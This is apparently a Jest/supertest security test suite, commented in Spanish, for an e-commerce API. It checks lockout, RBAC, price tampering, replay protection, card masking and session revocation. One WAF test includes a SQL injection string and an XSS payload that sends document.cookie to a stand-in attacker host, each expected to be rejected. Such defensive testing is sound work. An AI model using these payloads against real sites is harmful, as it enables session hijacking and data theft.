/**
 * Suite de Pruebas de Seguridad (Apartados 18 y 25, OWASP ASVS, OWASP Top 10, PCI DSS, SEG-01 a SEG-18)
 */

const request = require('supertest');
const { initDatabase, getDb } = require('../src/db/database');
const { createApp } = require('../src/app');

describe('Pruebas de Seguridad - Controles SEG-01 a SEG-18 (OWASP ASVS / Top 10 / PCI DSS)', () => {
  let app;
  let clienteToken;
  let adminToken;

  beforeAll(async () => {
    initDatabase(':memory:');
    app = createApp();

    // Login cliente
    const cRes = await request(app).post('/api/auth/login').send({
      email: 'cliente@expressmart.mx',
      password: 'ClientePassword123!'
    });
    clienteToken = cRes.body.token;

    // Login admin con MFA
    const aStep1 = await request(app).post('/api/auth/login').send({
      email: 'admin@expressmart.mx',
      password: 'AdminPassword123!'
    });
    const aStep2 = await request(app).post('/api/auth/login').send({
      email: 'admin@expressmart.mx',
      password: 'AdminPassword123!',
      mfaCode: aStep1.body.demoHintCode
    });
    adminToken = aStep2.body.token;
  });

  test('SEG-01: Bloqueo de cuenta ante ataques de fuerza bruta (5 intentos fallidos)', async () => {
    await request(app).post('/api/auth/register').send({
      nombre: 'Usuario BruteForce',
      email: 'bruteforce@expressmart.mx',
      password: 'PasswordValida123!',
      direccion: 'Av. Reforma 100, CDMX',
      consentimientoPrivacidad: true
    });

    for (let i = 0; i < 5; i += 1) {
      const failRes = await request(app).post('/api/auth/login').send({
        email: 'bruteforce@expressmart.mx',
        password: 'PasswordIncorrecta999!'
      });
      expect(failRes.status).toBe(401);
    }

    // Al 6to intento, incluso con la contraseña correcta, debe devolver 423 Locked
    const lockedRes = await request(app).post('/api/auth/login').send({
      email: 'bruteforce@expressmart.mx',
      password: 'PasswordValida123!'
    });
    expect(lockedRes.status).toBe(423);
  });

  test('SEG-02 y SEG-04: Prevención de escalamiento de privilegios RBAC', async () => {
    // Cliente intenta crear un producto en el catálogo -> 403 Forbidden
    const prodAttempt = await request(app)
      .post('/api/products')
      .set('Authorization', `Bearer ${clienteToken}`)
      .send({
        sku: 'EM-HACK-999',
        nombre: 'Producto No Autorizado',
        descripcion: 'Intento de acceso sin rol',
        categoria: 'Computo',
        marca: 'Hack',
        precio: 100,
        condiciones_envio: 'N/A'
      });
    expect(prodAttempt.status).toBe(403);

    // Cliente intenta consultar la bitácora de auditoría -> 403 Forbidden
    const auditAttempt = await request(app)
      .get('/api/audit-logs')
      .set('Authorization', `Bearer ${clienteToken}`);
    expect(auditAttempt.status).toBe(403);
  });

  test('SEG-05 y SEG-06: Prevención de manipulación de precios, cantidades negativas y transacciones duplicadas (Replay)', async () => {
    // Cantidad negativa rechazada
    const negQty = await request(app).post('/api/cart/calculate').send({
      items: [{ productoId: 1, cantidad: -3 }]
    });
    expect(negQty.status).toBe(400);

    // Intento de enviar precio manipulado ($0.01) para una Laptop de $18,499: el servidor ignora el precio del cliente
    const priceTamper = await request(app).post('/api/cart/calculate').send({
      items: [{ productoId: 1, cantidad: 1, precio: 0.01 }]
    });
    expect(priceTamper.status).toBe(200);
    expect(priceTamper.body.subtotal).toBe(18499);

    // Protección Anti-Replay con idempotencyKey repetido
    const idemKey = 'idem_replay_test_unique_001';
    const firstTx = await request(app)
      .post('/api/checkout')
      .set('Authorization', `Bearer ${clienteToken}`)
      .send({
        items: [{ productoId: 5, cantidad: 1 }],
        direccionEnvio: 'Insurgentes Sur 1602, CDMX',
        metodoPago: 'tarjeta',
        idempotencyKey: idemKey
      });
    expect(firstTx.status).toBe(201);

    const replayTx = await request(app)
      .post('/api/checkout')
      .set('Authorization', `Bearer ${clienteToken}`)
      .send({
        items: [{ productoId: 5, cantidad: 1 }],
        direccionEnvio: 'Insurgentes Sur 1602, CDMX',
        metodoPago: 'tarjeta',
        idempotencyKey: idemKey
      });
    expect(replayTx.status).toBe(409);
  });

  test('SEG-07 y PCI DSS (NOR-06): Ningún PAN completo ni CVV se almacena en texto claro en la base de datos', () => {
    const db = getDb();
    const txRows = db.prepare('SELECT * FROM transacciones').all();
    expect(txRows.length).toBeGreaterThan(0);
    for (const tx of txRows) {
      expect(tx.tarjeta_enmascarada).toMatch(/^\*\*\*\* \*\*\*\* \*\*\*\* \d{4}$|^WALLET/);
      expect(tx.boveda_cifrada).toMatch(/^enc:v1:/);
      expect(JSON.stringify(tx)).not.toContain('4111111111114242');
    }
  });

  test('SEG-08 y SEG-11: Bloqueo de Inyección SQL y Cross-Site Scripting (XSS) por el WAF', async () => {
    const sqliRes = await request(app).get("/api/products?q=1' UNION SELECT * FROM usuarios --");
    expect(sqliRes.status).toBe(400);

    const xssRes = await request(app)
      .post('/api/products/1/reviews')
      .set('Authorization', `Bearer ${clienteToken}`)
      .send({
        calificacion: 5,
        comentario: '<script>document.location="http://attacker.tld/?c="+document.cookie</script>'
      });
    expect(xssRes.status).toBe(400);
  });

  test('SEG-03 y SEG-15: Revocación de sesión al cerrar sesión y verificación de cadena de auditoría SHA-256', async () => {
    // Verificar cadena de auditoría intacta
    const logsRes = await request(app)
      .get('/api/audit-logs')
      .set('Authorization', `Bearer ${adminToken}`);
    expect(logsRes.status).toBe(200);
    expect(logsRes.body.chainIntact).toBe(true);
    expect(logsRes.body.totalEntries).toBeGreaterThan(5);

    // Cerrar sesión del cliente y comprobar que el token queda revocado inmediatamente
    const logoutRes = await request(app)
      .post('/api/auth/logout')
      .set('Authorization', `Bearer ${clienteToken}`);
    expect(logoutRes.status).toBe(200);

    const afterLogout = await request(app)
      .get('/api/auth/profile')
      .set('Authorization', `Bearer ${clienteToken}`);
    expect(afterLogout.status).toBe(401);

    // Petición sin token de sesión -> 401
    expect((await request(app).get('/api/auth/profile')).status).toBe(401);

    // Código MFA inválido -> 401
    const badMfa = await request(app).post('/api/auth/login').send({
      email: 'admin@expressmart.mx',
      password: 'AdminPassword123!',
      mfaCode: '999999'
    });
    expect(badMfa.status).toBe(401);

    // Validaciones en alta y edición de productos y pedidos
    expect(
      (await request(app)
        .post('/api/products')
        .set('X-Session-Token', adminToken)
        .send({ sku: 'INCOMPLETO' })).status
    ).toBe(400);

    expect(
      (await request(app)
        .post('/api/products')
        .set('X-Session-Token', adminToken)
        .send({
          sku: 'EM-LAP-001',
          nombre: 'Duplicado',
          descripcion: 'Desc',
          categoria: 'Computo',
          marca: 'TechNova',
          precio: 1000,
          condiciones_envio: 'Envío'
        })).status
    ).toBe(409);

    expect(
      (await request(app)
        .put('/api/products/99999')
        .set('X-Session-Token', adminToken)
        .send({ precio: 500 })).status
    ).toBe(404);

    expect(
      (await request(app)
        .patch('/api/orders/99999/status')
        .set('X-Session-Token', adminToken)
        .send({ estado: 'enviado' })).status
    ).toBe(404);

    expect(
      (await request(app)
        .patch('/api/orders/1/status')
        .set('X-Session-Token', adminToken)
        .send({ estado: 'estado_invalido' })).status
    ).toBe(400);

    expect(
      (await request(app)
        .post('/api/privacy/arco')
        .set('X-Session-Token', adminToken)
        .send({ tipo: 'invalido', descripcion: 'test' })).status
    ).toBe(400);
  });
});

